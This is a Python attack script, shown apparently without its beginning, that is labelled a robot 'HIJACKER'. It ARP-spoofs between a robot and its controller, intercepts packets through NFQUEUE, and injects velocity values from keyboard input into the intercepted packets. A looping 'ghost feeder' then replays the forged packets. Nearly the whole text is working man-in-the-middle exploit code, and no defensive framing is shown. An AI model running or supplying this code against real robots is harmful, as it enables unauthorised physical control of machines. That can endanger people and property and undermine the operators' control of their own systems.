target_linear  = 0.0
target_angular = 0.0
last_packet    = None 

# --- SSH KEYBOARD ENGINE ---
def get_key():
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if select.select([sys.stdin], [], [], 0.1)[0]:
            return sys.stdin.read(1)
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

def keyboard_control_thread():
    global target_linear, target_angular
    # Calibrated to your hex values (1.6 speed)
    speed, turn = 1.6, 2.0
    
    print("[*] HIJACKER READY")
    print("[*] W/S: Forward/Back | A/D: Left/Right | SPACE: Stop")
    
    while True:
        key = get_key()
        if key:
            k = key.lower()
            if k == 'w':
                target_linear = speed; target_angular = 0.0
            elif k == 's':
                target_linear = -speed; target_angular = 0.0
            elif k == 'a':
                target_linear = 0.0; target_angular = turn
            elif k == 'd':
                target_linear = 0.0; target_angular = -turn
            elif k == ' ':
                target_linear = 0.0; target_angular = 0.0
                print("\n[!] STOP SENT")
        time.sleep(0.02)

# --- THE GHOST FEEDER (Continuous Heartbeat) ---
def ghost_feeder_thread():
    global last_packet, target_linear, target_angular
    while True:
        # Only start sending if we've captured a valid session template
        if last_packet:
            pkt = last_packet.copy()
            modified = inject_data(pkt)
            if modified:
                send(modified, verbose=False)
        time.sleep(0.05) # 20Hz

# --- HEX-MAPPED INJECTION ---
def inject_data(scapy_pkt):
    global target_linear, target_angular
    if not scapy_pkt.haslayer(Raw): return None
    
    raw_data = bytearray(scapy_pkt[Raw].load)
    
    # 1. Find Data Marker (15 05)
    marker = b'\x15\x05'
    marker_pos = raw_data.find(marker)
    
    if marker_pos != -1:
        # 2. Find CDR Header (Your hex uses 01 00 00 00 / 00 00 01 00)
        data_start = raw_data.find(b'\x01\x00\x00\x00', marker_pos)
        if data_start == -1:
            data_start = raw_data.find(b'\x00\x00\x01\x00', marker_pos)
        
        if data_start != -1:
            # 3. Apply Hex-Mapped Offsets
            # Linear X is 4 bytes after header, Angular Z is 40 bytes after Linear X
            lin_x_off = data_start + 4
            ang_z_off = lin_x_off + 40
            
            if len(raw_data) >= ang_z_off + 8:
                # Inject Double-Precision Floats (Little Endian)
                raw_data[lin_x_off:lin_x_off+8] = struct.pack('<d', float(target_linear))
                raw_data[ang_z_off:ang_z_off+8] = struct.pack('<d', float(target_angular))
                
                scapy_pkt[Raw].load = bytes(raw_data)
                
                # Clear Checksums for Kernel Acceptance
                if IP in scapy_pkt:
                    del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
                if UDP in scapy_pkt:
                    del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
                return scapy_pkt
    return None

# --- PACKET CAPTURE (NFQUEUE) ---
def process_packet(packet):
    global last_packet
    try:
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(Raw):
            # Save this as our 'Prime' packet for the Ghost Feeder
            last_packet = scapy_pkt
            
            # Inject WASD values in real-time
            modified = inject_data(scapy_pkt)
            if modified:
                packet.set_payload(bytes(modified))
    except:
        pass
    packet.accept()

# --- NETWORK UTILS ---
def get_mac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if fields[0] == ip: return fields[3]
    except: return None

def arp_flood(r_mac, c_mac):
    while True:
        # Tell Robot we are the Controller
        sendp(Ether(dst=r_mac)/ARP(op=2, pdst=robot_ip, hwdst=r_mac, psrc=controller_ip), verbose=False)
        # Tell Controller we are the Robot
        sendp(Ether(dst=c_mac)/ARP(op=2, pdst=controller_ip, hwdst=c_mac, psrc=robot_ip), verbose=False)
        time.sleep(0.05)

if __name__ == "__main__":
    r_mac, c_mac = get_mac(robot_ip), get_mac(controller_ip)
    if r_mac and c_mac:
        threading.Thread(target=arp_flood, args=(r_mac, c_mac), daemon=True).start()
        threading.Thread(target=keyboard_control_thread, daemon=True).start()
        threading.Thread(target=ghost_feeder_thread, daemon=True).start()
        
